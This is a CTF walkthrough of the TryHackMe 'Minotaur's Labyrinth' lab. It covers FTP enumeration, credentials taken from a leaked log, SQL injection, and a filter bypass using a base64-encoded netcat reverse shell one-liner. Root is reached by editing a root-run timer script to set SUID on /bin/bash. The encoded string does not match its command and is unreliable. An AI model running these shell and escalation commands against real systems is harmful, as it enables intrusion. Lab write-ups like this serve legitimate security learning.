
#CTF #Red-Team #TryHackMe #Writeup

### ==Introduction==

Hello guys, this will be my first Writeup about a CTF in TryHackMe. First the *Minotaur's Labyrinth* room was created by **@xenox** and **@spayc**. I found the room really interesting and want to thank to authors for such a fun room, now let's get back to the challenge!



![[Pasted image 20241025151101.png]]


## <u>Find the flags</u>

*Hi, it's me, Daedalus, the creator of the Labyrinth. I was able to implement some backdoors, but Minotaur was able to (partially) fix them (that's a secret, so don't tell anyone). But let's get back to your task, root this machine and give Minotaur a lesson.*

### Informations we get:

- #### A (couple) backdoors may be available
- #### Four flags to find
- #### Minotaus have to learn a lesson :)



## <u>What is Flag 1?</u>

 ##### After machine was booted i thrown out a nmap scan:
 - `nmap -p21,80,443,3306 -sV -A -O -sC -T5 10.10.217.125 -oN scan-results.txt`


````
# Nmap 7.94SVN scan initiated Fri Oct 25 09:39:11 2024 as: nmap -p21,80,443,3306 -sV -A -O -sC -T5 -oN scan-results.txt 10.10.217.125
Nmap scan report for 10.10.217.125
Host is up (0.083s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
| fingerprint-strings: 
|   GetRequest, SMBProgNeg, SSLSessionReq: 
|_    220 ProFTPD Server (ProFTPD) [::ffff:10.10.217.125]
80/tcp   open  http    Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
| http-title: Login
|_Requested resource was login.html
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
443/tcp  open  http    Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-title: Bad request!
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=10/25%Time=671B9F95%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,35,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x20\[::ffff:10\.
SF:10\.217\.125\]\r\n")%r(SSLSessionReq,35,"220\x20ProFTPD\x20Server\x20\(
SF:ProFTPD\)\x20\[::ffff:10\.10\.217\.125\]\r\n")%r(SMBProgNeg,35,"220\x20
SF:ProFTPD\x20Server\x20\(ProFTPD\)\x20\[::ffff:10\.10\.217\.125\]\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   39.70 ms 10.9.0.1
2   94.67 ms 10.10.217.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 25 09:39:57 2024 -- 1 IP address (1 host up) scanned in 45.94 seconds
````


### <u>Port 21</u>

#### We see now the port 21 open for anonymous login, so why don't we try to login?
##### (Target machine crashed, so i restarted it)

![[Pasted image 20241025160349.png]]

#### Nice we are in, there is file called **message.txt**. Lets read that.

````
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find 
something :)
-- Minotaur
````

- #### Now we see a message **from** **Minotaur** and some possible usernames which can be usefull later.

    1. Daedalus
    2. Minotaur

#### If you think we are done with that port 21, you are wrong, we have we have not yet used the **ls** future with the **flags -la**.
#### (The FTP port was really slowed so i transfered the files in my local machine)

- `ls -la`

![[Pasted image 20241025161601.png]]

#### Wow there is a directory called **.secret** and after we **cd** into it we see **2 files**, one of them are the **first Flag** and second one is the help that we can move forward called **keep_in_mind.txt**.



## <u>What is Flag 2?</u>

#### Okay we got the flag 1, what now? secondly there is a file called **keep_in_mind.txt**, lets read the source

`cat keep_in_mind.txt`

````
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur

````

#### Hmm it **may be usefull later**, lets move on!


### <u>Port 3306</u>


#### Lets try to access the port 3306, that may be our flag 2

`mysql -h labyrinth.thm -P 3306 -u root -p`

![[Pasted image 20241025183237.png]]

#### Ups.. looks like we may **not have access** to port 3306 recently. We sadly have to move on again.


### <u>Port 80</u>


#### Lets look into the **webserver**, what is in there?

![[Pasted image 20241025183558.png]]

#### Looks like a pretty looking **login page** lets try things and find out the white rabbit hole

##### 1. Black rabbit holes

- Default Credentials
- CVE
- Forgot Password
- SQLi
- CE(Blind)
- Misconfiguration

##### 2. White rabbit hole

- IDOR / dirsearch

#### After we find out the right hole we have to dig in, so lets launch a **ffuf session**.

![[Pasted image 20241025184011.png]]

#### Looks like we have to **filter the size**. Lets do it!

![[Pasted image 20241025184045.png]]

#### Okay that looks better there is in total **7 paths** that we can enumerate. By the way don't think of the CVE that was recently come out from cgi-bin, because it is the wrong version of the apache ;)

#### Lets look into **logs**, that seems pretty interesting

![[Pasted image 20241025184500.png]]

#### Huh? **a post_log.log** file, lets take a look into it

````
POST /minotaur/minotaur-box/login.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 36
sec-ch-ua: "Chromium";v="93", " Not;A Brand";v="99"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/minotaur/minotaur-box/login.html
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=8co2rbqdli7itj8f566c61nkhv
Connection: close

email=Daedalus&password=g2e55kh4ck5r
````

#### Looks like someone forgot to delete his post request to the login page, this is why you shouldn't use http..

#### So we **got the** **username** **and the** **password** lets login into the web application.

![[Pasted image 20241025232800.png]]

#### Ermm.. a choose table section and a textbar, you know what it means. **SQLi**!!!!

![[Pasted image 20241025233212.png]]

#### Got some **MD5 hashes**. This is too much to crack, lets get more information with the ultimate super duper tool **Sqlmap**.

![[Pasted image 20241025233317.png]]

#### Now we know that **M!n0taur** is a **administrator** in this website and has admin persmissions lets **crack his password** tho!

![[Pasted image 20241025233431.png]]

#### Interesting, let's login.

![[Pasted image 20241025233541.png]]

#### Aaaand.. Yeahh that worked. We got the second flag!



## What is the user flag?

#### Wait a minute we aren't done yet, there is a **secret_stuff function**. That looks interesting lets take a look to the secret_stuff and **the Hint**.


![[Pasted image 20241025233935.png]]

![[Pasted image 20241025233946.png]]

#### I mean if there is a **command pannel**, that means most of the time in CTFs possible **Command execution vulnerability**. Since we can see on the hint, we can be sure that it is a command execution and we need a**webshell** now.

#### By the way, do anyone see the `|` ?
#### I don't. Lets try it, and hope that works.

![[Pasted image 20241025234640.png]]

#### Lmao, that worked *(I didin't got it first try)* so since there is a **filter** going on, on the background, we have to use a **encoding method**.. like a **Base64**!

`echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <PORT> >/tmp/f' | base64 -w0`

`cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7adsfSsasDaSAyPiYxfG5jIDEwLjkuMy4xNCA0NDQ1ID4vdG1wL2YK`  

#### Now we execute that, by **decoding** it first then executing the **bash**script

![[Pasted image 20241025235204.png]]

#### Waiting..

#### SHELL POP UP!!!!!!

![[Pasted image 20241026000331.png]]

#### After we stabilize our shell we can get the 3. Flag from **/home/user/flag.txt**



## What is the root flag?


#### Time to **escalate our privileges**, firstly first if we look into the / paths we see a path called**timers**..

#### Hmm, remember the **Hint** that we got from the **Ftp server**?

````
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur
````

#### After we cd into the path we see a..

#### File called **timer.sh FROM ROOT AND WE HAVE THE RIGHT PRIVILEGES**!! Let's modify it to give 4777(**SUID**) rights with chmod to **/bin/bash** file.

![[Pasted image 20241026001126.png]]

#### 2 Mins later will get the /bin/bash SUID rights and we can get the**root permissions** from the root with the command:

`/bin/bash -p`

![[Pasted image 20241026001358.png]]

#### And the last root flag do we get in **/root/da_king_flek.txt**



## The End

#### We got the **all flags** and gave Minotaur **a lesson**, I **thank you** again for reading my walkthrough and hopefully you learned something new from it. I **see you** on the next one!

# ------------------------------------------------------------------
